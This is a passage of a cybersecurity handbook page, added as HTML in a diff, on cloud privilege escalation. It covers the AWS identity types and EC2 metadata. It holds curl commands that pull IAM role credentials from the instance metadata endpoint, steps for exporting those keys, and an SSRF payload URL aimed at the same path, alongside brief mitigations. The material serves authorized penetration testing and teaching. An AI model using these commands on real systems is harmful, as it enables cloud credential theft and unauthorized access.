@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><title>Untitled</title><meta charset="utf-8"/><link rel="preload" href="../index-b488e415.css" as="style"/><link rel="preload" href="../prescript-2bfc6315.js" as="script"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space Grotesk:wght@400;700&amp;family=Inter:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Cybersecurity Handbook"/><meta property="og:title" content="Untitled"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Untitled"/><meta name="twitter:description" content="Modern Cloud and Container Privilege Escalation Privilege Escalation Handbook — File 06 AWS, Azure, GCP, containers, Kubernetes, and CI/CD Authorized cloud assessments only — watch for production blast radius Table of Contents Cloud Privesc Mindset AWS Privilege Escalation Azure / Entra ID Privilege..."/><meta property="og:description" content="Modern Cloud and Container Privilege Escalation Privilege Escalation Handbook — File 06 AWS, Azure, GCP, containers, Kubernetes, and CI/CD Authorized cloud assessments only — watch for production blast radius Table of Contents Cloud Privesc Mindset AWS Privilege Escalation Azure / Entra ID Privilege..."/><meta property="og:image:alt" content="Modern Cloud and Container Privilege Escalation Privilege Escalation Handbook — File 06 AWS, Azure, GCP, containers, Kubernetes, and CI/CD Authorized cloud assessments only — watch for production blast radius Table of Contents Cloud Privesc Mindset AWS Privilege Escalation Azure / Entra ID Privilege..."/><meta property="og:image" content="https://cybersecurity-handbook.vercel.app/static/og-image.png"/><meta property="og:image:url" content="https://cybersecurity-handbook.vercel.app/static/og-image.png"/><meta name="twitter:image" content="https://cybersecurity-handbook.vercel.app/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="cybersecurity-handbook.vercel.app"/><meta property="og:url" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/06_modern_cloud_and_container_privilege_escalation"/><meta property="twitter:url" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/06_modern_cloud_and_container_privilege_escalation"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Modern Cloud and Container Privilege Escalation Privilege Escalation Handbook — File 06 AWS, Azure, GCP, containers, Kubernetes, and CI/CD Authorized cloud assessments only — watch for production blast radius Table of Contents Cloud Privesc Mindset AWS Privilege Escalation Azure / Entra ID Privilege..."/><meta name="generator" content="Quartz"/><link href="../index-b488e415.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-735924e0.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-589c1cea.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-2911f5d1.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-e427079e.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-53b25b2b.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-c93c6a44.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-8a06014f.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-77d6a441.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-6ee21cee.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-1ea6ad18.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-34bdfded.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-788c9ca3.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-642859cd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-4abc06bd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-274a3dfe.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-94cb6c84.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-58d5ff56.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-9f9b2774.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-caf7c009.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-7262b5a7.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-a5c806d2.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-6bd36952.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-9857b007.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-d3a1a224.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" data-persist="true"/><script src="../prescript-2bfc6315.js" type="application/javascript" data-persist="true"></script><script type="application/javascript" data-persist="true">const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted%20Grotesk%3Awght%40400%3B700&amp;family=Source%20Sans%20Pro%3Aital%2Cwght%400%2C400%3B0%2C600%3B1%2C400%3B1%2C600&amp;family=IBM%20Plex%20Mono%3Awght%40400%3B600&amp;display=swap"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/06_modern_cloud_and_container_privilege_escalation-og-image.webp"/><meta property="og:image:url" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/06_modern_cloud_and_container_privilege_escalation-og-image.webp"/><meta name="twitter:image" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/06_modern_cloud_and_container_privilege_escalation-og-image.webp"/><meta property="og:image:type" content="image/webp"/></head><body data-slug="privilege-escalation-handbook/06_modern_cloud_and_container_privilege_escalation" data-basepath><div id="quartz-root" class="page" data-frame="default"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="..">Cybersecurity Handbook</a></h2><div class="mobile-only"><div class="spacer"></div></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 0.5rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button" aria-label="Search" aria-expanded="false"><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg><p>Search</p></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something..." placeholder="Search for something..."/><div class="search-layout" data-preview="true" data-field-priority="[&quot;title&quot;,&quot;content&quot;,&quot;tags&quot;]"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode" aria-label="Dark mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode" aria-label="Reader mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer nav-files-container" data-behavior="collapse" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a2, b2) => {\r\n    if (!a2.isFolder &amp;&amp; !b2.isFolder || a2.isFolder &amp;&amp; b2.isFolder) {\r\n      return (a2.displayName || \&quot;\&quot;).localeCompare(b2.displayName || \&quot;\&quot;, void 0, {\r\n        numeric: true,\r\n        sensitivity: \&quot;base\&quot;\r\n      });\r\n    }\r\n    if (!a2.isFolder &amp;&amp; b2.isFolder) {\r\n      return 1;\r\n    }\r\n    return -1;\r\n  }&quot;,&quot;filterFn&quot;:&quot;(node) => node.slugSegment !== \&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;(node) => {\r\n    return node;\r\n  }&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-300" aria-label="Explorer"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-300" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#" class="nav-file-title tree-item-self"></a></li></template><template id="template-folder"><li><div class="folder-container nav-folder-title tree-item-self"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon nav-folder-collapse-indicator collapse-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content tree-item-children"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><p show-comma="true" class="content-meta"><time datetime="2026-08-05T18:59:14.000Z">Aug 06, 2026</time><span>11 min read</span></p></div></div><article class="popover-hint"><div class="markdown-preview-view markdown-rendered"><h1 id="modern-cloud-and-container-privilege-escalation">Modern Cloud and Container Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#modern-cloud-and-container-privilege-escalation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<blockquote>
+<p><strong>Privilege Escalation Handbook</strong> — File 06<br/>
+AWS, Azure, GCP, containers, Kubernetes, and CI/CD<br/>
+Authorized cloud assessments only — watch for production blast radius</p>
+</blockquote>
+<hr/>
+<h2 id="table-of-contents">Table of Contents<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#table-of-contents" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ol>
+<li><a href="#1-cloud-privesc-mindset" class="internal internal-link alias">Cloud Privesc Mindset</a></li>
+<li><a href="#2-aws-privilege-escalation" class="internal internal-link alias">AWS Privilege Escalation</a></li>
+<li><a href="#3-azure--entra-id-privilege-escalation" class="internal internal-link alias">Azure / Entra ID Privilege Escalation</a></li>
+<li><a href="#4-gcp-privilege-escalation" class="internal internal-link alias">GCP Privilege Escalation</a></li>
+<li><a href="#5-container-escape-techniques" class="internal internal-link alias">Container Escape Techniques</a></li>
+<li><a href="#6-kubernetes-privilege-escalation" class="internal internal-link alias">Kubernetes Privilege Escalation</a></li>
+<li><a href="#7-cicd-pipeline-attacks" class="internal internal-link alias">CI/CD Pipeline Attacks</a></li>
+<li><a href="#8-cross-cutting-patterns" class="internal internal-link alias">Cross-Cutting Patterns</a></li>
+<li><a href="#9-detection--hardening" class="internal internal-link alias">Detection &amp; Hardening</a></li>
+<li><a href="#10-references" class="internal internal-link alias">References</a></li>
+</ol>
+<hr/>
+<h2 id="1-cloud-privesc-mindset">1. Cloud Privesc Mindset<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-cloud-privesc-mindset" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="11-differences-from-host-privesc">1.1 Differences From Host Privesc<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11-differences-from-host-privesc" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Classic host</th><th>Cloud</th></tr></thead><tbody><tr><td>Root/SYSTEM on one box</td><td>Control plane API permissions</td></tr><tr><td>Local file creds</td><td>IAM roles, tokens, metadata</td></tr><tr><td>Patch kernel</td><td>Misconfigured policies &amp; trust</td></tr><tr><td>Persistence on disk</td><td>Keys, roles, backdoor users, lambdas</td></tr></tbody></table></div>
+<h3 id="12-universal-playbook">1.2 Universal Playbook<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12-universal-playbook" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ol>
+<li><strong>Identify identity</strong> — role, service principal, SA, instance profile</li>
+<li><strong>Enumerate permissions</strong> — effective policy, not just attached names</li>
+<li><strong>Find privilege paths</strong> — create user, pass role, self-escalate</li>
+<li><strong>Abuse data plane</strong> — secrets, storage, CI variables</li>
+<li><strong>Expand</strong> — org/management group/folder hierarchy</li>
+</ol>
+<h3 id="13-metadata-service-warning">1.3 Metadata Service Warning<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#13-metadata-service-warning" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Cloud instance metadata endpoints are high-value. SSRF to metadata is a classic path to role credentials.</p>
+<blockquote>
+<p><strong>Pro tip:</strong> In every cloud engagement, map <strong>who can assume what</strong> and <strong>where secrets live</strong> before chasing exotic CVEs.</p>
+</blockquote>
+<hr/>
+<h2 id="2-aws-privilege-escalation">2. AWS Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-aws-privilege-escalation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="21-identity-types">2.1 Identity Types<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#21-identity-types" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Identity</th><th>Notes</th></tr></thead><tbody><tr><td>IAM user</td><td>Long-lived access keys</td></tr><tr><td>IAM role</td><td>Assumed via STS; preferred</td></tr><tr><td>Instance profile</td><td>EC2 role via metadata</td></tr><tr><td>Federated / SSO</td><td>Temporary creds</td></tr><tr><td>Service-linked roles</td><td>AWS services</td></tr></tbody></table></div>
+<h3 id="22-ec2-instance-metadata">2.2 EC2 Instance Metadata<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#22-ec2-instance-metadata" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p><strong>IMDSv1 (less safe):</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> http://169.254.169.254/latest/meta-data/</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> http://169.254.169.254/latest/meta-data/iam/security-credentials/</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</span></span></code></pre></figure>
+<p><strong>IMDSv2 (session token required):</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">TOKEN</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -X</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> PUT</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;http://169.254.169.254/latest/api/token&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">)</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;X-aws-ec2-metadata-token: </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">$TOKEN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">  http://169.254.169.254/latest/meta-data/iam/security-credentials/</span></span></code></pre></figure>
+<p>Export:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="keyword">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> AWS_ACCESS_KEY_ID</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">...</span></span>
+<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="keyword">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> AWS_SECRET_ACCESS_KEY</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">...</span></span>
+<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="keyword">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> AWS_SESSION_TOKEN</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">...</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">aws</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> sts</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-caller-identity</span></span></code></pre></figure>
+<h3 id="23-ssrf--metadata">2.3 SSRF → Metadata<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#23-ssrf--metadata" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>If a web app fetches URLs, try:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="text" data-theme="github-light github-dark"><code data-language="text" data-theme="github-light github-dark" style="display:grid;"><span data-line><span>http://169.254.169.254/latest/meta-data/iam/security-credentials/</span></span></code></pre></figure>
+<p>Mitigations: IMDSv2 hop limit, blocking metadata from app layers, SSRF fixes.</p>
